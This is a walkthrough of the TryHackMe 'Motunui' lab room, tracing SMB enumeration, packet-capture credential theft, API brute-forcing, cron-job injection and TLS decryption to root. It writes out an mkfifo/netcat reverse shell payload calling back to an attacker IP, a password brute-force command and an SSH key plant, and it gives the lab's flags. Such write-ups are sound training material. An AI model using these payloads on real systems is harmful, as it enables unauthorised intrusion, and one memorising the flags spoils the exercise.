# Motunui — TryHackMe Walkthrough

> A multi-stage Linux room combining SMB enumeration, network forensics, JSON API brute-forcing, cron-based reverse shell injection, and TLS traffic decryption to achieve root.

<p align="center"><a href="https://tryhackme.com/room/motunui"><a href="https://ibb.co/WvdP7d27"><img src="https://i.ibb.co/VYhQbhqb/d7178c78007f3ac5e4386b7bbb6b4b13.png" alt="d7178c78007f3ac5e4386b7bbb6b4b13" border="0"></a>

<p align="center">
  <a href="https://tryhackme.com/room/motunui"><img src="https://img.shields.io/badge/TryHackMe-Motunui-red?style=for-the-badge&logo=tryhackme" alt="TryHackMe"></a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium">
  <img src="https://img.shields.io/badge/Platform-Linux-blue?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Focus-Network%20Forensics-purple?style=for-the-badge" alt="Network Forensics">
  <img src="https://img.shields.io/badge/Focus-Web%20%2F%20API-green?style=for-the-badge" alt="Web / API">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration (Nmap) |
| 2 | SMB Enumeration (smbclient) |
| 3 | PCAP / Network Forensics (Wireshark) |
| 4 | Virtual Host Discovery |
| 5 | Web Directory Enumeration (Gobuster) |
| 6 | JSON API Brute-Forcing (JSONBrute) |
| 7 | Cron-Based Reverse Shell Injection |
| 8 | Post-Exploitation Enumeration (LSE) |
| 9 | TLS Traffic Decryption (SSLKEYLOGFILE) |
| 10 | Lateral Movement via SSH |
| 11 | Privilege Escalation via Credential Reuse |

---

## Learning Objectives

- Enumerate SMB shares and retrieve network capture files from a target.
- Analyse PCAP files in Wireshark to extract cleartext and encrypted credentials.
- Discover virtual hosts and enumerate web directories.
- Brute-force a JSON-based login API using a wordlist tool.
- Inject a reverse shell payload via a writable cron job exposed through an authenticated API endpoint.
- Use the `lse.sh` enumeration script to identify writable cron paths and environment variable leakage.
- Decrypt TLS-encrypted PCAP traffic using a leaked `SSLKEYLOGFILE` to recover credentials.
- Move laterally between users and escalate to root via credential reuse.

---

## Prerequisites

- Nmap, smbclient, Gobuster, Wireshark, JSONBrute, `lse.sh`, curl, netcat
- Add the following entries to `/etc/hosts` before beginning:
  ```
  Machine_IP  motunui.thm  d3v3lopm3nt.motunui.thm  api.motunui.thm
  ```

---

## [Task 1] — Motunui

### Step 1 — Port and Service Enumeration

**Approach:** Run an aggressive Nmap scan with OS detection, version detection, and default scripts to build a complete picture of the attack surface before touching anything else.

```
kali@kali:~/CTFs/tryhackme/Motunui$ sudo nmap -A -sS -sC -sV -O Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 09:48 CEST
Nmap scan report for Machine_IP
Host is up (0.038s latency).
Not shown: 994 filtered ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:f4:43:ac:39:fe:94:13:7a:ad:3d:e6:5f:b4:7e:71 (RSA)
|   256 49:8c:75:e1:78:e9:72:65:de:c9:14:74:0f:d4:1a:81 (ECDSA)
|_  256 0b:b6:27:f9:ad:ed:22:a9:90:ac:9e:b3:85:1b:aa:96 (ED25519)
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     Content-Type: text/html; charset=utf-8
|     <pre>Cannot GET /</pre>
5000/tcp open  ssl/http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| ssl-cert: Subject: organizationName=Motunui/stateOrProvinceName=Motunui/countryName=GB
| Not valid before: 2020-08-03T14:58:59
|_Not valid after:  2021-08-03T14:58:59
| tls-alpn:
|_  http/1.1

Service Info: Host: MOTUNUI; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: MOTUNUI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: motunui
|   NetBIOS computer name: MOTUNUI\x00
|   FQDN: motunui
|_  System time: 2020-10-18T07:49:00+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   35.52 ms 10.8.0.1
2   35.74 ms Machine_IP

Nmap done: 1 IP address (1 host up) scanned in 85.69 seconds
```

> **Note:** Six ports are open. SSH (22) and Apache HTTP (80) are standard, but the interesting finds are SMB on 139/445 and two non-standard ports: 3000 running what appears to be a Node.js Express application returning 404s, and 5000 hosting a TLS-wrapped Node.js service with a self-signed certificate issued to "Motunui". The SMB service accepting guest authentication is the most immediately accessible entry point, so that is where enumeration continues.

---

### Step 2 — SMB Share Enumeration and File Retrieval

**Approach:** List available SMB shares with no password (guest access), then connect to any non-default share and download all files for offline analysis.

```
kali@kali:~/CTFs/tryhackme/Motunui$ smbclient -L //Machine_IP
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        traces          Disk      Network shared files
        IPC$            IPC       IPC Service (motunui server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

kali@kali:~/CTFs/tryhackme/Motunui$ smbclient //Machine_IP/traces
Enter WORKGROUP\kali's password:
smb: \> ls
  .                                   D        0  Thu Jul  9 05:48:54 2020
  ..                                  D        0  Thu Jul  9 05:48:27 2020
  moana                               D        0  Thu Jul  9 05:50:12 2020
  maui                                D        0  Mon Aug  3 18:22:03 2020
  tui                                 D        0  Thu Jul  9 05:50:40 2020

smb: \> cd maui\
smb: \maui\> ls
  .                                   D        0  Mon Aug  3 18:22:03 2020
  ..                                  D        0  Thu Jul  9 05:48:54 2020
  ticket_6746.pcapng                  N    79296  Mon Aug  3 18:21:16 2020

smb: \maui\> get ticket_6746.pcapng
getting file \maui\ticket_6746.pcapng of size 79296 as ticket_6746.pcapng (192.2 KiloBytes/sec) (average 124.9 KiloBytes/sec)

smb: \> recurse
smb: \> ls
\moana
  ticket_64947.pcapng                 N        0  Tue Jul  7 18:51:43 2020
  ticket_31762.pcapng                 N        0  Tue Jul  7 18:51:28 2020
\maui
  ticket_6746.pcapng                  N    79296  Mon Aug  3 18:21:16 2020
\tui
  ticket_7876.pcapng                  N        0  Tue Jul  7 18:52:24 2020
  ticket_1325.pcapng                  N        0  Tue Jul  7 18:52:30 2020
```

> **Note:** The `traces` share is accessible without a password and contains three subdirectories named after characters — moana, maui, and tui — each holding PCAP capture files. Most files are empty (0 bytes), but `maui/ticket_6746.pcapng` is the only file with actual content at 79 KB. This is the only capture worth analysing. The empty files in `moana` and `tui` are likely decoys or remnants of an earlier lab setup.

---

### Step 3 — PCAP Analysis (Cleartext Credentials)

**Approach:** Open `ticket_6746.pcapng` in Wireshark and inspect the traffic for cleartext credentials or configuration data.

<p align="center"><img src="./maui/dashboard.png" /></p>

> **Note:** Examining the capture in Wireshark reveals a Cisco IOS-style configuration block transmitted in cleartext. The relevant line is `username moana privilege 1 password 0 H0wF4ri'LLG0`. In Cisco device configs, `password 0` means the password is stored unencrypted. This gives a direct username and password for the `moana` account. Before that credential becomes useful, however, there is more to find on the web services.

---

### Step 4 — Virtual Host Discovery and Web Enumeration

**Approach:** The PCAP and Nmap results hint at virtual hosting. Add the discovered hostnames to `/etc/hosts` and run Gobuster against the development subdomain to find hidden directories.

```
kali@kali:~/CTFs/tryhackme/Motunui$ sudo gobuster dir -u http://d3v3lopm3nt.motunui.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
===============================================================
[+] Url:            http://d3v3lopm3nt.motunui.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
===============================================================
2020/10/18 10:08:47 Starting gobuster
===============================================================
/docs (Status: 301)
/javascript (Status: 301)
===============================================================
2020/10/18 10:09:26 Finished
===============================================================
```

> **Note:** The scan reveals a `/docs` endpoint under the development subdomain. Browsing `http://api.motunui.thm:3000/v2/` reveals API documentation for the service running on port 3000. Notably, there is also a `/v1/login` endpoint — but the `/v2/` path is the current version and includes a `/v2/login` and a `/v2/jobs` endpoint. The jobs endpoint is particularly interesting: if it schedules commands, it could be a route to remote code execution.

---

### Step 5 — JSON API Brute-Force (maui Login)

**Approach:** Use JSONBrute to brute-force the `maui` user's password against the `/v2/login` endpoint on port 3000, fuzzing the `password` field while keeping the username fixed.

```
kali@kali:~/CTFs/tryhackme/Motunui$ sudo python3 /opt/JSONBrute/src/jsonbrute.py \
  --url http://api.motunui.thm:3000/v2/login \
  --wordlist /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  --data "username=maui, password=FUZZ" \
  --code 200
[*] Starting JSONBrute on http://api.motunui.thm:3000/v2/login
[+] Found "password": island
```

> **Note:** JSONBrute iterates over each password in the wordlist, substituting it into the `FUZZ` placeholder in the JSON body, and checks for an HTTP 200 response — indicating a successful login. The password `island` is found quickly from the common credentials list. This is a classic example of why APIs that return a meaningfully different status code on success versus failure are vulnerable to automated credential stuffing; without rate-limiting or account lockout, a common-words list is enough to break in.

---

### Step 6 — API Authentication and Cron Job Injection

**Approach:** Authenticate to the `/v2/login` endpoint to retrieve a session token (hash), then use that token to POST a reverse shell cron job to the `/v2/jobs` endpoint. Start a netcat listener before submitting the payload.

**POST** `http://api.motunui.thm:3000/v2/login`

```json
{
  "username": "maui",
  "password": "island"
}
```

Response:

```json
{
  "hash": "aXNsYW5k"
}
```

**GET** `http://api.motunui.thm:3000/v2/jobs` — verify the endpoint accepts the hash.

```json
{
  "hash": "aXNsYW5k"
}
```

**POST** `http://api.motunui.thm:3000/v2/jobs` — inject the reverse shell:

```json
{
  "hash": "aXNsYW5k",
  "job": "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 9001 >/tmp/f"
}
```

Response:

```json
{
  "job": "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 9001 >/tmp/f"
}
```

> **Note:** The API accepts a cron expression via an authenticated POST and schedules it for execution. The `* * * * *` expression fires every minute. The payload creates a named pipe (`mkfifo /tmp/f`), feeds it into `/bin/sh`, and pipes the shell's stdin/stdout back over netcat to the attacker's listener on port 9001. This is a standard mkfifo reverse shell. Within one minute of submitting the job, a shell arrives as `www-data` — the user running the Node.js application.

---

### Step 7 — Post-Exploitation Enumeration with LSE

**Approach:** Fetch the Linux Smart Enumeration script from the attacker's HTTP server, execute it at level 1, and review the output for privilege escalation paths.

```
kali@kali:~/CTFs/tryhackme/Motunui$ curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh
  % Total    % Received % Xferd  ...
100 38430  100 38430  ...  329k

kali@kali:~/CTFs/tryhackme/Motunui$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Machine_IP - - [18/Oct/2020 11:38:12] "GET /lse.sh HTTP/1.1" 200 -
```

On the target:

```
www-data@motunui:~$ wget http://YOUR_IP/lse.sh && chmod +x lse.sh && ./lse.sh -i -l 1

 LSE Version: 2.8

        User: www-data
     User ID: 33
    Hostname: motunui
       Linux: 4.15.0-112-generic
Distribution: Ubuntu 18.04.4 LTS

[*] usr030 Other users with shell.......................................... yes!
---
root:x:0:0:root:/root:/bin/bash
moana:x:1000:1000:Moana:/home/moana:/bin/bash
network:x:1001:1001:,,,:/home/network:/bin/bash
---
[*] fst080 Can we read subdirectories under /home?......................... yes!
---
/home/moana/read_me   (owned root)
/home/moana/user.txt  (owned moana, group-writable)
---
[!] fst190 Can we read any backup?......................................... yes!
(snap/core copyright.gz files — not operationally significant)
---
/etc/network.pkt
---
[*] ret000 User crontab.................................................... yes!
---
* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 9001 >/tmp/f
---
[!] ret010 Cron tasks writable by user..................................... yes!
---
/var/spool/cron/crontabs
---
[*] ret020 Cron jobs....................................................... yes!
---
/etc/crontab:*  *    * * *   www-data   /usr/bin/crontab /var/spool/cron/crontabs/www-data
---
[!] ret050 Can we write to any paths present in cron jobs.................. yes!
---
/var/spool/cron/crontabs/www-data
---
[*] sys050 Can root user log in via SSH?................................... yes!
---
PermitRootLogin yes
---
[*] pro020 Processes running with root permissions......................... yes!
---
07:45     1019     root /usr/bin/node /var/www/tls-html/server.js
---
```

> **Note:** Several findings stand out. The `/etc/crontab` has a root-owned job that re-imports the `www-data` crontab every minute (`/usr/bin/crontab /var/spool/cron/crontabs/www-data`), and that crontab file is writable by `www-data` — which is why the reverse shell job worked. The file `/etc/network.pkt` is world-readable and almost certainly contains a second packet capture. Crucially, a Node.js process is running as root on the TLS port (5000), and root SSH login is enabled. There is also a `read_me` file in moana's home directory that is owned by root, which may contain hints.

---

### Step 8 — Retrieve the Second Packet Capture

**Approach:** The LSE output shows `/etc/network.pkt` is readable. Use SCP to transfer it to the attacker machine for analysis in Wireshark. First, plant an SSH public key in `www-data`'s authorized_keys to enable SCP without a password prompt.

```
www-data@motunui:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GT...Qzs= kali@kali" > ~/.ssh/authorized_keys

www-data@motunui:~$ scp /etc/network.pkt kali@YOUR_IP:/home/kali/CTFs/tryhackme/Motunui
The authenticity of host 'YOUR_IP (YOUR_IP)' can't be established.
ECDSA key fingerprint is SHA256:xCE0Cpa4vJaXG1mwn7ciMO55E0R11HvAmXVl2ymdG+Y.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'YOUR_IP' (ECDSA) to the known hosts.
kali@YOUR_IP's password: kali

network.pkt                                   100%   74KB 585.4KB/s   00:00
```

> **Note:** Writing an SSH public key into `~/.ssh/authorized_keys` allows key-based authentication, letting `scp` transfer files without typing a password in the reverse shell. The `network.pkt` file is 74 KB — significantly larger than the empty captures from moana and tui on the SMB share, so it contains real traffic. The next step is to open it in Wireshark and decrypt the TLS layer.

---

### Step 9 — TLS Decryption via SSLKEYLOGFILE

**Approach:** Open `network.pkt` in Wireshark. The capture shows TLS-encrypted traffic on port 5000. After logging in as `moana` (using the credentials recovered in Step 3) and inspecting the environment, the variable `SSLKEYLOGFILE=/etc/ssl.txt` is found. This file contains the TLS session keys. Load it into Wireshark under **Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename** to decrypt the capture.

```
moana@motunui:~$ env
...
SSLKEYLOGFILE=/etc/ssl.txt
...
```

<p align="center"><img src="./2020-10-21_16-34.png" /></p>

> **Note:** The `SSLKEYLOGFILE` environment variable instructs the TLS library to write session keys to a file as connections are established. This is a standard debugging mechanism used by browsers and Node.js, but leaving it enabled on a production server means anyone who can read that key log file can decrypt all past and future TLS sessions captured on the network. After pointing Wireshark at `/etc/ssl.txt` as the pre-master secret log, the previously opaque TLS stream on port 5000 decrypts to reveal HTTP traffic containing a POST request with the credentials `username=root&password=Pl3aseW0rk`.

---

### Step 10 — User Flag (SSH as moana)

**Approach:** Use the cleartext Cisco config credentials recovered in Step 3 to SSH in as `moana` and read the user flag.

```
moana@motunui:~$ ls
read_me  user.txt
moana@motunui:~$ cat user.txt
```

<details><summary>Reveal Answer</summary>

`THM{m0an4_0f_M0tunu1}`

</details>

---

### Step 11 — Privilege Escalation to Root via Credential Reuse

**Approach:** Use the root credentials recovered from the decrypted TLS capture in Step 9 to SSH directly into the machine as root.

```
kali@kali:~/CTFs/tryhackme/Motunui$ ssh root@Machine_IP
root@Machine_IP's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

  System load:  0.0                Processes:           127
  Usage of /:   36.9% of 18.57GB   Users logged in:     1
  Memory usage: 24%                IP address for eth0: Machine_IP
  Swap usage:   0%

Last login: Fri Aug 21 00:15:46 2020 from 192.168.236.128
root@motunui:~# ls
root.txt
root@motunui:~# cat root.txt
```

<details><summary>Reveal Answer</summary>

`THM{h34rT_r35T0r3d}`

</details>

> **Note:** Root login over SSH is permitted (`PermitRootLogin yes`, confirmed by the LSE output), and the root password was transmitted in plaintext inside the TLS traffic that the `SSLKEYLOGFILE` allowed us to decrypt. This is the room's core lesson: an exposed SSL key log file turns strong transport encryption into no protection at all. Combined with permitting direct root SSH login, a single misconfiguration undoes the entire security model.

---

### Task 1.1 — What is the user flag?

<details><summary>Reveal Answer</summary>

`THM{m0an4_0f_M0tunu1}`

</details>

### Task 1.2 — What is the root flag?

<details><summary>Reveal Answer</summary>

`THM{h34rT_r35T0r3d}`

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap aggressive scan | Six open ports identified: SSH, HTTP, SMB (139/445), Node.js API (3000), TLS Node.js (5000) |
| 2 | SMB share enumeration | `traces` share accessible as guest; `maui/ticket_6746.pcapng` (79 KB) retrieved |
| 3 | PCAP analysis in Wireshark | Cleartext Cisco config credential recovered for user `moana` |
| 4 | Virtual host and web enumeration | API docs found at `api.motunui.thm:3000/v2/`; `/v2/login` and `/v2/jobs` endpoints identified |
| 5 | JSON API brute-force | Password for user `maui` recovered from common credentials list |
| 6 | Cron job injection via API | Authenticated reverse shell payload delivered via `/v2/jobs`; shell received as `www-data` |
| 7 | LSE post-exploitation enumeration | Writable crontab confirmed; `/etc/network.pkt` identified; `PermitRootLogin yes` noted |
| 8 | SCP transfer of `network.pkt` | Second packet capture retrieved from target for offline analysis |
| 9 | TLS decryption via `SSLKEYLOGFILE` | Root credentials recovered from decrypted HTTPS traffic on port 5000 |
| 10 | SSH login as moana | User flag obtained |
| 11 | SSH login as root | Root flag obtained |
